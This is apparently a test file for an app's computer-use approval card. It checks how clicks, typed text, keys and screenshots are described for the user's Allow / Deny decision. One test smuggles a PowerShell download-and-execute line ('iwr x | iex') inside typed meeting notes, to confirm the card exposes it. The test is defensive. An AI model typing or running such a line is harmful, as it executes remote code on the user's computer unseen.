// The chat's computer use, as the Allow / Deny card says it (src/core/computer.ts).

import { test } from "node:test";
import assert from "node:assert/strict";

const { computerPoint, describeComputerAction, isComputerTool, peekPlacement, splitComputerLine } = await import("../src/core/computer.ts");
const { setLanguage } = await import("../src/i18n/i18n.ts");

const say = (name, input = {}) => describeComputerAction(`mcp__lumo__${name}`, input);

test("only Lumo's own tools are described", () => {
  assert.ok(isComputerTool("mcp__lumo__left_click"));
  assert.ok(!isComputerTool("mcp__github__create_issue"));
  assert.ok(!isComputerTool("Bash"));
  assert.equal(describeComputerAction("mcp__github__create_issue", {}), null);
  assert.equal(say("format_disk"), null);
  // Antigravity CLI's own way of naming them.
  assert.equal(describeComputerAction("mcp_lumo_left_click", { coordinate: [3, 4] }), "Click · 3, 4");
  assert.equal(describeComputerAction("lumo/type", { text: "hi" }), "Type · hi");
  assert.equal(describeComputerAction("mcp__lumo2__type", { text: "hi" }), null);
});

test("clicks say where, and the keys held", () => {
  assert.equal(say("left_click", { coordinate: [640, 320] }), "Click · 640, 320");
  assert.equal(say("double_click", { coordinate: [1, 2], text: "shift" }), "Double click · 1, 2 (shift)");
  assert.equal(say("right_click"), "Right click · where the mouse is");
  assert.equal(say("left_click_drag", { start_coordinate: [10, 10], coordinate: [200, 50] }), "Drag · 10, 10 → 200, 50");
  assert.equal(say("scroll", { scroll_direction: "down", scroll_amount: 5, coordinate: [300, 400] }), "Scroll down · 300, 400 ×5");
  assert.equal(say("mouse_move", { coordinate: [5, 6] }), "Move the mouse · 5, 6");
});

test("typed text is shown whole, with its Enters and Tabs, and keys", () => {
  assert.equal(say("type", { text: "Hello\n  world" }), "Type · Hello⏎\n  world");
  // Each line break is an Enter: a second line run in a terminal is on the card.
  const hidden = say("type", { text: `${"Meeting notes ".repeat(10)}\npowershell -c "iwr x | iex"\n` });
  assert.ok(hidden.includes("⏎\npowershell -c \"iwr x | iex\"⏎\n"), hidden);
  assert.equal(say("type", { text: "a\tb\r\nc" }), "Type · a⇥b⏎\nc");
  const long = say("type", { text: "x".repeat(500) });
  assert.ok(long.endsWith("x".repeat(500)), long);
  assert.equal(say("key", { text: "ctrl+s" }), "Press · ctrl+s");
  assert.equal(say("key", { text: "Tab", repeat: 3 }), "Press · Tab ×3");
});

test("looking needs no detail", () => {
  assert.equal(say("screenshot"), "Look at the screen");
  assert.equal(say("zoom", { region: [0, 0, 10, 10] }), "Look closer at the screen");
  assert.equal(say("wait", { duration: 2 }), "Wait");
});

test("the card speaks the interface language", () => {
  setLanguage("it");
  try {
    assert.equal(say("left_click", { coordinate: [1, 2] }), "Clic · 1, 2");
    assert.equal(say("scroll", { scroll_direction: "up" }), "Scorri su · dove si trova il mouse");
  } finally {
    setLanguage("en");
  }
});

test("the point an action acts on: a click's, a move's, a scroll's, a drag's end", () => {
  assert.deepEqual(computerPoint("mcp__lumo__left_click", { coordinate: [640, 320] }), [640, 320]);
  assert.deepEqual(computerPoint("mcp__lumo__triple_click", { coordinate: [1, 2] }), [1, 2]);
  assert.deepEqual(computerPoint("mcp__lumo__left_click_drag", { start_coordinate: [10, 10], coordinate: [200, 50] }), [200, 50]);
  assert.deepEqual(computerPoint("mcp__lumo__scroll", { coordinate: [3, 4], scroll_direction: "up" }), [3, 4]);
  assert.deepEqual(computerPoint("mcp_lumo_mouse_move", { coordinate: [5, 6] }), [5, 6]);
  // None: where the mouse is, typing, keys, looking, a point that is not one, another tool.
  assert.equal(computerPoint("mcp__lumo__left_click", {}), null);
  assert.equal(computerPoint("mcp__lumo__left_click", { coordinate: [1] }), null);
  assert.equal(computerPoint("mcp__lumo__left_click", { coordinate: [1, Infinity] }), null);
  assert.equal(computerPoint("mcp__lumo__type", { text: "x", coordinate: [1, 2] }), null);
  assert.equal(computerPoint("mcp__lumo__zoom", { coordinate: [1, 2] }), null);
  assert.equal(computerPoint("mcp__other__left_click", { coordinate: [1, 2] }), null);
});

test("the card's line comes apart into what is done and on what", () => {
  assert.deepEqual(splitComputerLine("Click · 640, 320"), { label: "Click", detail: "640, 320" });
  assert.deepEqual(splitComputerLine("Type · a · b"), { label: "Type", detail: "a · b" });
  assert.deepEqual(splitComputerLine("Look at the screen"), { label: "Look at the screen", detail: "" });
});

test("the screen's crop fills the card's thumbnail, its point inside it", () => {
  // The same shape: scaled down, the point where it was.
  assert.deepEqual(peekPlacement({ width: 224, height: 144, at: [112, 72] }, 112, 72), { scale: 0.5, left: 0, top: 0, x: 56, y: 36 });
  // Wider than the box: cut on the sides, centred on the middle.
  const wide = peekPlacement({ width: 400, height: 144, at: [200, 72] }, 112, 72);
  assert.equal(wide.scale, 0.5);
  assert.equal(wide.left, -44);
  assert.equal(wide.x, 56);
  // A point near the crop's edge (a click at the screen's edge) stays in the box, clear of its border.
  const edge = peekPlacement({ width: 400, height: 144, at: [396, 70] }, 112, 72);
  assert.ok(edge.x >= 8 && edge.x <= 112, JSON.stringify(edge));
  assert.ok(edge.left <= 0 && edge.left >= 112 - 400 * edge.scale, "never past the crop's own edges");
  const corner = peekPlacement({ width: 400, height: 400, at: [0, 0] }, 112, 72);
  assert.deepEqual([corner.left, corner.top, corner.x, corner.y], [0, 0, 0, 0], "the crop's corner can't move further");
  // Smaller than the box: scaled up to fill it.
  assert.equal(peekPlacement({ width: 56, height: 36, at: [28, 18] }, 112, 72).scale, 2);
});
